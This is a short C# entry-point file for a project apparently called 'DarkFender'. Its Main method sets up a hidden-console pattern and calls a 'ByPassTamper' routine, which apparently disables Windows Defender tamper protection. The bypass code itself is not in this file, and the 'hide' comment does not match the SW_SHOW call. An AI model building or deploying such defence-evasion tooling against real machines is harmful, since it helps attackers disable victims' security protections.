using System;
using System.Runtime.InteropServices;

//Author 0xyg3n

namespace DarkFender
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]

        #region invisible application
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0; // hide window
        const int SW_SHOW = 5; // show window
        #endregion

        #region main
        static void Main()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_SHOW); //hide application
            InitiateDarkFender.ByPassTamper(); 
        }
        #endregion
    }
}
